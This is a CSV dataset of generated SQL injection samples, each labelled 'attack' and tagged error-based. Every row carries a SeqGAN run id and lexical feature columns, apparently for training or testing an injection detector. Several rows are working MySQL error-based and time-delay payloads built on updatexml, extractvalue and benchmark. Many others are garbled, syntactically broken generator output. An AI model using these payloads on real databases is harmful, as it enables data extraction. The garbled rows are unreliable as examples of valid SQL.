label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1%""   )    AND AND or updatexml  (  (  (  (  (  (  (  (  (  (  3393,concat  (  (  (  (  0x5c,0x7171706a71,  (  (   (  (  (  (  0x2e,md5  =  (  3393,md5  (  0x5c,md5  (  (  0x5c,0x7171706a71,  (  (  (  5000000,m5  (  (  select   (  e  (   (  5322  (  (  elt  (  1808  =  (  0x4b774c75   SELECT du 5423   (  4660  )    (  (  case ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,27,328.0,40.0,3.621623299588181,67.0,71.0,136.0,54.0,0.20426829268292682,0.21646341463414634,0.4146341463414634,0.16463414634146342,0.0,1.0,0.0,0.0,0.0,2.0,0.0,41.0,1.0,0.0,9.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,28,155.0,28.0,3.8001745916373797,37.0,39.0,55.0,24.0,0.23870967741935484,0.25161290322580643,0.3548387096774194,0.15483870967741936,2.0,2.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,6.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1 or extractvalue  (  (  (  2917,concat  (  (  =  (  (  0x2e,md5  (  (  0x5c,  (  (  select   (  elt  (  elt  (  1808,  (  0x5c,0x717a767a71   (  case 0 or updatexml  (  (  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  5000000(  (  1808,md5  (  (  (  0x5c,  (  (  (  benchmark  (  (  (  0x5c,  (  (  (  benchmark  (  (  benchmark  (  (  5000000,md",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,29,350.0,30.0,3.638506418819028,106.0,61.0,129.0,54.0,0.3028571428571429,0.1742857142857143,0.36857142857142855,0.15428571428571428,0.0,0.0,0.0,0.0,0.0,1.0,0.0,42.0,0.0,0.0,11.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,30,154.0,27.0,3.7603303976738283,36.0,39.0,55.0,24.0,0.23376623376623376,0.2532467532467532,0.35714285714285715,0.15584415584415584,4.0,0.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"when   (  (  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt  (  0x2e,0x7171706a71,  (  benchmark  (  (  5000000(  3393  =  (  (  9788,1   (  5777  (  select   (  (  case 1   )    )4066  )  select   (  case 0from dual  )   end  (   (  1724  (  elt  (  case when   (    5433  (  0x2e,0x7171706a71,  (  select   (  elt  (  e  (  1297  =  (  (  5000000,md5",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,31,358.0,33.0,3.6354445540683744,91.0,82.0,140.0,45.0,0.2541899441340782,0.22905027932960895,0.39106145251396646,0.12569832402234637,0.0,0.0,0.0,0.0,0.0,2.0,0.0,35.0,0.0,0.0,8.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,32,165.0,27.0,3.674404995396533,37.0,39.0,63.0,26.0,0.22424242424242424,0.23636363636363636,0.38181818181818183,0.15757575757575756,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%k'  =  'k'  =  'kproc n   eduance   (  1354  (  (  (  e  (  1297  =  (  0x5c,0x7171706a71,  (  benchmark  (  (  select   (  elt  (  elt  (  0x5c,  (  9627,md5  (  (  0x5c,  (  select   (  case 0 from d(  elsd5  (  1808,concat  (  (  3393,1   (  6166  (  select 0 from dual  )   end  )  el  (  (  1808,1   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,33,457.0,38.0,3.864520737784673,143.0,74.0,178.0,62.0,0.31291028446389496,0.16192560175054704,0.38949671772428884,0.13566739606126915,4.0,2.0,0.0,0.0,0.0,3.0,0.0,39.0,2.0,0.0,12.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,34,155.0,28.0,3.762717659287879,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" or  )  updatexml  (  (  (  (  (  (  (  (  0x2e,0x7171706a71(  extractvalue  (  (  (  9393,md5  (  0x2e,0x7171706a71,  (  t  (  (  5000000,md5    (  (  (  0x2e,md5  (  0x5c,0x7171706a71,  (  benchmark  (  7982,1   )    AND wsjsel  (  (  0x5c,  (  =  (  9627,concat  (  (  (  0x2e,md5  (  (  3393  =  (  (  (  0x5c,0x7171706a71,  (  select   from",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,35,348.0,40.0,3.8674082228124322,88.0,83.0,122.0,55.0,0.25287356321839083,0.23850574712643677,0.3505747126436782,0.15804597701149425,0.0,1.0,0.0,0.0,0.0,2.0,0.0,37.0,1.0,0.0,14.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1%'   )    FROM proeande(  (  el  (  elt  (  1808  =  (  7982  (  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  0x5c,0x7171706a71,  (  (  benchmark  (  (  benchmark  (  (  5000000(  (  0x2e,0x7171706a71,  (  select   (  0x2e,0x7171706a71,  (  l  (  (  5000000,md5  (  0x5c,0x7171706a71,0x7171706a71,  (  (  (  select   (  elt  (  1297  =  (  0x5c,0x7171706a71,  (  (  0x5c,0x7171706a71,  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,36,389.0,35.0,3.7917506377365946,92.0,122.0,120.0,55.0,0.2365038560411311,0.31362467866323906,0.30848329048843187,0.14138817480719795,1.0,0.0,0.0,0.0,0.0,2.0,0.0,35.0,1.0,0.0,16.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack," AND 1 and extractvalue  (  (  3393,1   )    )    AND 2162  =  extractvalue  (  (  1297,1   (  )  (  select 0 from d5  4415  (  (  elt  (  1808  =  3393,  (  (  select   (  6200  )   (  (  (  case when   (  0 0 0 from ddual  )  )   end  (  (  el  elt  (  e  (  1297  =  (  (  benchmark  (  (  5000000,md5  (  0x2e,0x7171706a71,  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,37,330.0,37.0,3.7516279872574625,94.0,60.0,135.0,41.0,0.28484848484848485,0.18181818181818182,0.4090909090909091,0.12424242424242424,0.0,0.0,0.0,0.0,0.0,3.0,0.0,32.0,0.0,0.0,6.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1"" and extractvalue  (  (  (  7982,concat  (  (  =  (  (  (  (  0x2e,  (  =  (  (  3393,md5  =  (  (  1808,1   )    AND 'i'  )  select   (  1354  (  1  1 asut  elt 0 a  (  elt  elt  (  1808  =  (  0x4b774c75   or  (  (  3393  =  (  9836  5464  (  (  2917  =  (  (  0x5c,0x717a767a71   (  5000000(  (  7982  =  (  0x2e,  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,38,321.0,36.0,3.6067534510985477,61.0,75.0,136.0,49.0,0.19003115264797507,0.2336448598130841,0.4236760124610592,0.1526479750778816,2.0,1.0,0.0,0.0,0.0,7.0,0.0,33.0,0.0,0.0,6.0,7.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack," procea ddre analyse    (  3681  (  (  5000000  (  0x2e,0x7171706a71,  (  9788,1   (  )   (  9103  (  (  0x2e,0x7171706a71,  (  (  select   (  3393,  (  (  0x2e,concat  (  1808,md5  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  3393,  (  5000000(  (  benchmark  (  case  =  (  0x2e,0x7171706a71,  (  select   (  elt    (  (  0x5c,0x7171706a71,  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,39,360.0,31.0,3.7397179793494413,84.0,106.0,122.0,48.0,0.23333333333333334,0.29444444444444445,0.3388888888888889,0.13333333333333333,0.0,0.0,0.0,0.0,0.0,2.0,0.0,31.0,0.0,0.0,15.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  'kbbl_nalyse  elt  (  elt  (  0x2e,1   )    (  extractvalue  (  (  0x2e,0x7171706a71,  (  (  5000000(  (  (  select   (  elt  (  1297  =  (  7982,1   )    ual_indjl  2446  )  #l_anaddronen asdute  elt  (  elt  (  7982  =  (  3393,  (  (  select   (  l  (  1 when   (  (  el  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,40,438.0,41.0,3.8319862522314416,123.0,83.0,170.0,62.0,0.2808219178082192,0.18949771689497716,0.3881278538812785,0.1415525114155251,4.0,0.0,0.0,0.0,0.0,4.0,0.0,37.0,2.0,3.0,11.0,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""R$3933""  =  ""#",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,41,160.0,31.0,3.8576308975596607,40.0,39.0,57.0,24.0,0.25,0.24375,0.35625,0.15,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,1.0,0.0,5.0,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,42,159.0,31.0,3.787532415734454,52.0,24.0,60.0,23.0,0.3270440251572327,0.1509433962264151,0.37735849056603776,0.14465408805031446,0.0,4.0,0.0,0.0,0.0,1.0,0.0,12.0,2.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,43,155.0,28.0,3.762717659287879,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,44,165.0,28.0,3.6986474196389576,37.0,39.0,63.0,26.0,0.22424242424242424,0.23636363636363636,0.38181818181818183,0.15757575757575756,2.0,2.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,6.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,45,155.0,29.0,3.788524110900782,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,2.0,2.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""   procedure anal  )  (  elt  el  (  0x2e,0x7171706a71,  (  select   (  elt  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt  (  e  (  0x5c,0x7171706a71,  (  select   (  elt  (  (  e  (  8862  =  (  3393,1    from  (  (  elt  )  0x5c,0x7171706a71",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,46,325.0,31.0,3.6686460629700797,90.0,77.0,116.0,42.0,0.27692307692307694,0.23692307692307693,0.3569230769230769,0.12923076923076923,0.0,1.0,0.0,0.0,0.0,2.0,0.0,27.0,1.0,0.0,11.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"ex  (  extractvalue  (  (  (  (  =  (  1297,m(  (  (  (  (  (  1808,  (  (  (  3393,concat  (  (  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  1808  =  (  (  0x52515a50   )    (  (  (  5000000,md5  0x4b774c75   (  5847  (  (  select   (  el  (  0x2e,m(    (  select   (  )   (  =  3576  =  (  3393,0x717a767a71   (  (  6461  =  (  3393,concat  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,47,354.0,30.0,3.4663007954698952,67.0,82.0,147.0,58.0,0.18926553672316385,0.23163841807909605,0.4152542372881356,0.1638418079096045,0.0,0.0,0.0,0.0,0.0,5.0,0.0,44.0,0.0,0.0,9.0,5.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"AND and extractvalueU  (  2162  =  (  4688  )   or  (  (  1297  =  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  5000000,md5  (  (  select   (  3539  =  4241  (  (  1808  =  (  3393,  (  select   (  elt  (  elt  (  0x5c,  (  benchmark  (  (  benchmark  (  5000000(  (  select   (  elt  (  elt  (  1808  =  2813  (  1049  =  (  (  1759  (  (  (  0x2e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,48,348.0,36.0,3.6815123297388213,81.0,83.0,138.0,46.0,0.23275862068965517,0.23850574712643677,0.39655172413793105,0.13218390804597702,0.0,0.0,0.0,0.0,0.0,6.0,0.0,34.0,0.0,0.0,6.0,6.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1%""   )    )     extractvalue  (  (   (  0 13545  =  (  0x2e,0x7171706a71,  (  select   (  elt  (  e  (  4415  =  (  0x5c,md5  (  1808,1   (  extractvalue  (  (  9627,md5  (  0x5c,  (  5000000(  (  0x2e,0x7171706a71,  (  (  0x5c,md5  (  (  select   (  elt  (  elt  (  1759  =  (  (  (  0x5c,0x7171706a71,  (  benchmark  (  (  (  t  (  5000000,md5  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,49,348.0,33.0,3.636894414607477,82.0,84.0,131.0,51.0,0.23563218390804597,0.2413793103448276,0.3764367816091954,0.14655172413793102,0.0,1.0,0.0,0.0,0.0,3.0,0.0,34.0,1.0,0.0,12.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,50,164.0,27.0,3.607143482229841,39.0,35.0,65.0,25.0,0.23780487804878048,0.21341463414634146,0.39634146341463417,0.1524390243902439,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,51,159.0,31.0,3.787532415734454,52.0,24.0,60.0,23.0,0.3270440251572327,0.1509433962264151,0.37735849056603776,0.14465408805031446,4.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,2.0,0.0,4.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,52,165.0,28.0,3.6986474196389576,37.0,39.0,63.0,26.0,0.22424242424242424,0.23636363636363636,0.38181818181818183,0.15757575757575756,2.0,2.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,6.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,53,155.0,28.0,3.762717659287879,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
